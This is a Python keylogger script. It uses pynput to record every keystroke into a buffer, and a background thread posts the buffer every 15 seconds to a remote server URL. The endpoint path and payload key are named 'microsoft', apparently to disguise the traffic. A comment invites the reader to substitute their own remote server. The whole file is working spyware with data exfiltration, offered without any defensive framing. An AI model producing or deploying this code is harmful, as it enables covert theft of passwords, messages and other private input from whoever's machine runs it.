import time
import json
import requests
from pynput import keyboard
import threading

MAX_MEMORY_SIZE = 20 * 1024 * 1024  # 20 MB
KEYS = []

SERVER_URL = "http://192.168.93.128:5000/microsoft"  # Replace with your remote server's URL

def on_press(key):
    try:
        # Store the keystroke in memory
        if hasattr(key, 'char') and key.char:
            KEYS.append(key.char)  # Normal characters
        elif key == keyboard.Key.space:
            KEYS.append(" ")  # Spaces
        elif key == keyboard.Key.enter:
            KEYS.append("\n")  # New lines
        elif key == keyboard.Key.tab:
            KEYS.append("[TAB]")  # Tabs
        elif key == keyboard.Key.backspace:
            KEYS.append("[BACKSPACE]")  # Backspace
        else:
            KEYS.append(f"[{key.name.upper()}]")  # Other special keys

        # Check if memory size exceeds 20 MB
        if len(json.dumps(KEYS).encode('utf-8')) > MAX_MEMORY_SIZE:
            print("Memory size exceeded. Resetting the key buffer.")
            KEYS.clear()

    except Exception as e:
        print(f"Error: {e}")

def send_keys():
    while True:
        time.sleep(15)  # Wait for 15 seconds
        if KEYS:
            try:
                # Send collected keys to the server
                payload = {'microsoft': ''.join(KEYS)}
                response = requests.post(SERVER_URL, json=payload)

                if response.status_code == 200:
                    print("Keys sent successfully.")
                    KEYS.clear()  # Clear the keys after successful transmission
                else:
                    print(f"Failed to send keys. Server responded with: {response.status_code}")

            except requests.exceptions.RequestException as e:
                print(f"Network error: {e}")

def start_listener():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Start the keylogging listener in a separate thread
listener_thread = threading.Thread(target=start_listener)
listener_thread.daemon = True
listener_thread.start()

# Start the key sending loop in a separate thread
send_thread = threading.Thread(target=send_keys)
send_thread.daemon = True
send_thread.start()

# Block the main thread so the listener can run
while True:
    time.sleep(1)
